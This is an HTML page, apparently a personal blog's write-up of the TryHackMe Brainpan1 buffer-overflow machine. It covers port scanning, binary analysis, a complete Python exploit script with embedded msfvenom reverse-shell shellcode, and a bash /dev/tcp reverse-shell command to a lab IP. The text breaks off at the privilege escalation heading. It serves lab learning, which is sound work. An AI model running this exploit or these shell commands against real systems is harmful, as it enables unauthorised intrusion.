@@ -1,0 +1,387 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="">
+<meta name="description" content="Summary Brainpan is an easy buffer overflow challange where need to overflow a buffer to redirect the control to our shellcode. The binary in question is a windows binary, however it is running within a Linux machine.
+Enumeration Open ports: # Nmap 7.92 scan initiated Wed Jun 29 20:51:33 2022 as: nmap -A -T5 -Pn -oN init-nmap-scan 10.10.179.14 Nmap scan report for 10.10.179.14 Host is up (0.11s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 9999/tcp open abyss?" />
+<meta name="keywords" content="" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="" />
+<link rel="canonical" href="http://foxmaccloud.com/writeups/tryhackme/brainpan1/" />
+
+
+    <title>
+        
+            Brainpan1 :: FoxCorp  — Welcome to FoxCorp!
+        
+    </title>
+
+
+
+<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css" rel="stylesheet"
+    type="text/css">
+
+
+
+<link rel="stylesheet" href="/main.4e5c639214707eff609bb55fe49e183dee42258a73bc90e4cc7b0a84f900798a.css">
+
+
+
+
+
+
+<meta itemprop="name" content="Brainpan1">
+<meta itemprop="description" content="Summary Brainpan is an easy buffer overflow challange where need to overflow a buffer to redirect the control to our shellcode. The binary in question is a windows binary, however it is running within a Linux machine.
+Enumeration Open ports: # Nmap 7.92 scan initiated Wed Jun 29 20:51:33 2022 as: nmap -A -T5 -Pn -oN init-nmap-scan 10.10.179.14 Nmap scan report for 10.10.179.14 Host is up (0.11s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 9999/tcp open abyss?"><meta itemprop="datePublished" content="2022-07-01T16:23:06+02:00" />
+<meta itemprop="dateModified" content="2022-07-01T16:23:06+02:00" />
+<meta itemprop="wordCount" content="1139"><meta itemprop="image" content="http://foxmaccloud.com/"/>
+<meta itemprop="keywords" content="" />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="http://foxmaccloud.com/"/>
+
+<meta name="twitter:title" content="Brainpan1"/>
+<meta name="twitter:description" content="Summary Brainpan is an easy buffer overflow challange where need to overflow a buffer to redirect the control to our shellcode. The binary in question is a windows binary, however it is running within a Linux machine.
+Enumeration Open ports: # Nmap 7.92 scan initiated Wed Jun 29 20:51:33 2022 as: nmap -A -T5 -Pn -oN init-nmap-scan 10.10.179.14 Nmap scan report for 10.10.179.14 Host is up (0.11s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 9999/tcp open abyss?"/>
+
+
+
+
+    <meta property="og:title" content="Brainpan1" />
+<meta property="og:description" content="Summary Brainpan is an easy buffer overflow challange where need to overflow a buffer to redirect the control to our shellcode. The binary in question is a windows binary, however it is running within a Linux machine.
+Enumeration Open ports: # Nmap 7.92 scan initiated Wed Jun 29 20:51:33 2022 as: nmap -A -T5 -Pn -oN init-nmap-scan 10.10.179.14 Nmap scan report for 10.10.179.14 Host is up (0.11s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 9999/tcp open abyss?" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://foxmaccloud.com/writeups/tryhackme/brainpan1/" /><meta property="og:image" content="http://foxmaccloud.com/"/><meta property="article:section" content="writeups" />
+<meta property="article:published_time" content="2022-07-01T16:23:06+02:00" />
+<meta property="article:modified_time" content="2022-07-01T16:23:06+02:00" /><meta property="og:site_name" content="FoxCorp" />
+
+
+
+
+
+
+
+    <meta property="article:published_time" content="2022-07-01 16:23:06 &#43;0200 CEST" />
+
+
+
+
+
+
+
+
+
+
+    </head>
+
+    
+        <body>
+    
+    
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">></span>
+            <span class="logo__text">$ cd /home/</span>
+            <span class="logo__cursor" style=
+                  "
+                   
+                   ">
+            </span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+            
+                <nav class="menu">
+    <ul class="menu__inner"><li><a href="/posts/">Posts</a></li><li><a href="/whoami/">whoami</a></li><li><a href="/writeups/">Writeups</a></li>
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+            
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+    <main class="post">
+
+        <div class="post-info">
+            
+            </p>
+        </div>
+
+        <article>
+            <h2 class="post-title"><a href="http://foxmaccloud.com/writeups/tryhackme/brainpan1/">Brainpan1</a></h2>
+
+            
+            
+            
+
+            <div class="post-content">
+                <h2 id="summary">Summary</h2>
+<p>Brainpan is an easy buffer overflow challange where need to overflow a buffer to redirect the control to our shellcode. The binary in question is a windows binary, however it is running within a Linux machine.</p>
+<h2 id="enumeration">Enumeration</h2>
+<ol>
+<li>Open ports:</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Nmap 7.92 scan initiated Wed Jun 29 20:51:33 2022 as: nmap -A -T5 -Pn -oN init-nmap-scan 10.10.179.14</span>
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.179.14
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.11s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">998</span> closed tcp ports <span style="color:#f92672">(</span>conn-refused<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>PORT      STATE SERVICE VERSION
+</span></span><span style="display:flex;"><span>9999/tcp  open  abyss?
+</span></span><span style="display:flex;"><span>| fingerprint-strings: 
+</span></span><span style="display:flex;"><span>|   NULL: 
+</span></span><span style="display:flex;"><span>|     _| _| 
+</span></span><span style="display:flex;"><span>|     _|_|_| _| _|_| _|_|_| _|_|_| _|_|_| _|_|_| _|_|_| 
+</span></span><span style="display:flex;"><span>|     _|_| _| _| _| _| _| _| _| _| _| _| _|
+</span></span><span style="display:flex;"><span>|     _|_|_| _| _|_|_| _| _| _| _|_|_| _|_|_| _| _|
+</span></span><span style="display:flex;"><span>|     <span style="color:#f92672">[</span>________________________ WELCOME TO BRAINPAN _________________________<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>|_    ENTER THE PASSWORD
+</span></span><span style="display:flex;"><span>10000/tcp open  http    SimpleHTTPServer 0.6 <span style="color:#f92672">(</span>Python 2.7.3<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_http-title: Site doesn<span style="color:#960050;background-color:#1e0010">&#39;</span>t have a title <span style="color:#f92672">(</span>text/html<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>|_http-server-header: SimpleHTTP/0.6 Python/2.7.3
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span> service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+</span></span><span style="display:flex;"><span>SF-Port9999-TCP:V<span style="color:#f92672">=</span>7.92%I<span style="color:#f92672">=</span>7%D<span style="color:#f92672">=</span>6/29%Time<span style="color:#f92672">=</span>62BC9F3E%P<span style="color:#f92672">=</span>x86_64-pc-linux-gnu%r<span style="color:#f92672">(</span>NU
+</span></span><span style="display:flex;"><span>SF:LL,298,<span style="color:#e6db74">&#34;_\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_\|\x20\x20\x20\x20
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:20\n_\|_\|_\|\x20\x20\x20\x20_\|\x20\x20_\|_\|\x20\x20\x20\x20_\|_\|_\|
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:\x20\x20\x20\x20\x20\x20_\|_\|_\|\x20\x20\x20\x20_\|_\|_\|\x20\x20\x20\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:x20\x20\x20_\|_\|_\|\x20\x20_\|_\|_\|\x20\x20\n_\|\x20\x20\x20\x20_\|\x
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:20\x20_\|_\|\x20\x20\x20\x20\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\n_\|\x20\x20\x20\x20_\|
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:\x20\x20_\|\x20\x20\x20\x20\x20\x20\x20\x20_\|\x20\x20\x20\x20_\|\x20\x
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:20_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\n_\|_\|_\|\x20\x
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:20\x20\x20_\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_\|_\|_\|\x20\x20_
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|_\|_\|\x20\x20\x20\x20\x20\x
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:20_\|_\|_\|\x20\x20_\|\x20\x20\x20\x20_\|\n\x20\x20\x20\x20\x20\x20\x20
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:20\x20_\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\x20\x20\x20\x20\x20\x20\x2
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:x20\x20_\|\n\n\[________________________\x20WELCOME\x20TO\x20BRAINPAN\x
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:20_________________________\]\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20ENTER\x
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:20THE\x20PASSWORD\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\n\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:\x20\x20\x20\x20\x20\x20\x20\x20&gt;&gt;\x20&#34;</span><span style="color:#f92672">)</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Nmap done at Wed Jun 29 20:52:15 2022 -- 1 IP address (1 host up) scanned in 42.56 seconds</span>
+</span></span></code></pre></div><ol start="2">
+<li>Using netcat <code>nc 10.10.179.14 9999</code> we get greeted with a prompt asking for input. Since it&rsquo;s a bufferoverflow I assume this is an input that needs to be overflown.</li>
+<li>On port 10000 we see a website with an image about &ldquo;practicing safe coding&rdquo;.</li>
+<li>Enumerate the website using gobuster</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gobuster dir -u http://10.10.179.14:10000/ -t <span style="color:#ae81ff">10</span> -w /usr/share/dict/directory-list-2.3-medium.txt -o gobuster-scan
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>/bin                  <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 0<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; /bin/<span style="color:#f92672">]</span>
+</span></span></code></pre></div><p>At http://10.10.179.14:10000/bin we also see <code>brainpan.exe</code>. Attempting to run this with wine, I see that it looks like the prompt on the server. Assuming it&rsquo;s the same binary as the one running on the server.</p>
+<h2 id="finding-the-buffer-size">Finding the buffer size</h2>
+<ol>
+<li>I analyze this file in ghidra. Looking at where the input is given, we see that <code>_strcpy()</code> is used to copy the input into a buffer. I know that strcpy() doesn&rsquo;t check for buffer size and will copy even if it doesn&rsquo;t fit, can overflow.</li>
+<li>In the decompile window we can also see that the buffer <code>_strcpy()</code> copies to is also decleared with the size of <code>520</code>. This means that we have our buffer size. We could also have used <code>metasploit/tools/exploit/pattern_create.rb</code> with <code>metasploit/tools/exploit/pattern_offset.rb</code> to find the size.</li>
+<li>I&rsquo;m not sure what protections are on this binary, but I&rsquo;m going to try to overflow the buffer and execute my shellcode on the stack. To do this I want to fill the EIP with the address of an <code>jmp ESP</code>. Looking at the debugger I see that there is a 4 byte offset to the EIP register, so I need to do 524 chars for the overflow. There happen to only be only one case of <code>jmp ESP</code> instruction and that instruction happend to be within a function called <code>_winkwink</code>. I think this is a good sign that I&rsquo;m on the right track.</li>
+</ol>
+<h2 id="building-our-script">Building our script</h2>
+<ol>
+<li>First I tried to fill the buffer then see what registers gets filled next. The next one that got filled was the EIP register. Since I want to redirect the code flow to our jmp ESP, I copied this address to my script;</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> sys<span style="color:#f92672">,</span> socket
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>addr <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;127.0.0.1&#34;</span>
+</span></span><span style="display:flex;"><span>port <span style="color:#f92672">=</span> <span style="color:#ae81ff">9999</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>buffer <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">524</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># little endian</span>
+</span></span><span style="display:flex;"><span>buffer <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xf3\x12\x17\x31</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>buffer <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>    s<span style="color:#f92672">=</span>socket<span style="color:#f92672">.</span>socket(socket<span style="color:#f92672">.</span>AF_INET, socket<span style="color:#f92672">.</span>SOCK_STREAM)
+</span></span><span style="display:flex;"><span>    s<span style="color:#f92672">.</span>connect((addr, port))
+</span></span><span style="display:flex;"><span>    s<span style="color:#f92672">.</span>send((buffer))
+</span></span><span style="display:flex;"><span>    s<span style="color:#f92672">.</span>close()
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
+</span></span><span style="display:flex;"><span>    print(e)
+</span></span></code></pre></div><p>Ghidra told me that this was &ldquo;little endian&rdquo; this means that we go from right to left instead of left to right. so 0x311712f3 =&gt; \xf3\x12\x17\x31.</p>
+<p>Running the script the application now crashes when it hits junk on the stack.</p>
+<ol start="2">
+<li>Next step is to check for bad characters. I went to <a href="https://repo.4pfsec.com/buffer-overflow/remote-buffer-overflow/finding-bad-characters">this website</a> and copied their list of bad characters. I then added all these characters to the buffer. Looking at the stack for my application I could then see if a spesific byte didn&rsquo;t work or not. I&rsquo;m also assuming 0x00 is a bad characters as it&rsquo;s null terminator.</li>
+</ol>
+<h2 id="making-our-payload">Making our payload</h2>
+<ol>
+<li>To create our shellcode I used this command <code>msfvenom -p windows/shell_reverse_tcp -b &quot;\x00&quot; LHOST=127.0.0.1 LPORT=8080 -f python -a x86</code> I then added this output to our buffer in our script. I also added some padding to make sure we get all of our shellcode.</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> sys<span style="color:#f92672">,</span> socket
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>addr <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;127.0.0.1&#34;</span>
+</span></span><span style="display:flex;"><span>port <span style="color:#f92672">=</span> <span style="color:#ae81ff">9999</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>buffer <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">524</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># little endian</span>
+</span></span><span style="display:flex;"><span>buffer <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xf3\x12\x17\x31</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># padding</span>
+</span></span><span style="display:flex;"><span>buffer <span style="color:#f92672">+=</span>  <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x90</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">10</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># local payload</span>
+</span></span><span style="display:flex;"><span>buffer <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xba\x71\x66\x49\x9b\xd9\xc9\xd9\x74\x24\xf4\x5d\x2b</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>buffer <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xc9\xb1\x52\x31\x55\x12\x83\xed\xfc\x03\x24\x68\xab</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>buffer <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x6e\x3a\x9c\xa9\x91\xc2\x5d\xce\x18\x27\x6c\xce\x7f</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>buffer <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x2c\xdf\xfe\xf4\x60\xec\x75\x58\x90\x67\xfb\x75\x97</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>buffer <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xc0\xb6\xa3\x96\xd1\xeb\x90\xb9\x51\xf6\xc4\x19\x6b</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>buffer <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x39\x19\x58\xac\x24\xd0\x08\x65\x22\x47\xbc\x02\x7e</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>buffer <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x54\x37\x58\x6e\xdc\xa4\x29\x91\xcd\x7b\x21\xc8\xcd</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>buffer <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x7a\xe6\x60\x44\x64\xeb\x4d\x1e\x1f\xdf\x3a\xa1\xc9</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>buffer <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x11\xc2\x0e\x34\x9e\x31\x4e\x71\x19\xaa\x25\x8b\x59</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>buffer <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x57\x3e\x48\x23\x83\xcb\x4a\x83\x40\x6b\xb6\x35\x84</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>buffer <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xea\x3d\x39\x61\x78\x19\x5e\x74\xad\x12\x5a\xfd\x50</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>buffer <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xf4\xea\x45\x77\xd0\xb7\x1e\x16\x41\x12\xf0\x27\x91</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>buffer <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xfd\xad\x8d\xda\x10\xb9\xbf\x81\x7c\x0e\xf2\x39\x7d</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>buffer <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x18\x85\x4a\x4f\x87\x3d\xc4\xe3\x40\x98\x13\x03\x7b</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>buffer <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x5c\x8b\xfa\x84\x9d\x82\x38\xd0\xcd\xbc\xe9\x59\x86</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>buffer <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x3c\x15\x8c\x09\x6c\xb9\x7f\xea\xdc\x79\xd0\x82\x36</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>buffer <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x76\x0f\xb2\x39\x5c\x38\x59\xc0\x37\x38\x9e\xca\xc6</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>buffer <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xae\x9c\xca\xd7\xbe\x28\x2c\x8d\xae\x7c\xe7\x3a\x56</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>buffer <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x25\x73\xda\x97\xf3\xfe\xdc\x1c\xf0\xff\x93\xd4\x7d</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>buffer <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x13\x43\x15\xc8\x49\xc2\x2a\xe6\xe5\x88\xb9\x6d\xf5</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>buffer <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xc7\xa1\x39\xa2\x80\x14\x30\x26\x3d\x0e\xea\x54\xbc</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>buffer <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xd6\xd5\xdc\x1b\x2b\xdb\xdd\xee\x17\xff\xcd\x36\x97</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>buffer <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xbb\xb9\xe6\xce\x15\x17\x41\xb9\xd7\xc1\x1b\x16\xbe</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>buffer <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x85\xda\x54\x01\xd3\xe2\xb0\xf7\x3b\x52\x6d\x4e\x44</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>buffer <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x5b\xf9\x46\x3d\x81\x99\xa9\x94\x01\xa9\xe3\xb4\x20</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>buffer <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x22\xaa\x2d\x71\x2f\x4d\x98\xb6\x56\xce\x28\x47\xad</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>buffer <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xce\x59\x42\xe9\x48\xb2\x3e\x62\x3d\xb4\xed\x83\x14</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>buffer <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>    s<span style="color:#f92672">=</span>socket<span style="color:#f92672">.</span>socket(socket<span style="color:#f92672">.</span>AF_INET, socket<span style="color:#f92672">.</span>SOCK_STREAM)
+</span></span><span style="display:flex;"><span>    s<span style="color:#f92672">.</span>connect((addr, port))
+</span></span><span style="display:flex;"><span>    s<span style="color:#f92672">.</span>send((buffer))
+</span></span><span style="display:flex;"><span>    s<span style="color:#f92672">.</span>close()
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
+</span></span><span style="display:flex;"><span>    print(e)
+</span></span></code></pre></div><ol start="2">
+<li>Now listening on my local machine with the command <code>nc -lnvp 8080</code> and running this script, I get a cmd shell on my local machine.</li>
+<li>I can now remake the shellcode with my vpn ip and try it on the server. And boom! We now have a user shell! Because the cmd shell was a little buggy and I wanted a bash shell I used <code>/bin/bash</code> to run the command <code>bash -i &gt;&amp; /dev/tcp/10.10.10.10/8081 0&gt;&amp;1</code> to get a regular bash shell.</li>
+</ol>
+<h2 id="privilege-escalation">Privilege escalation</h2>
+<ol>
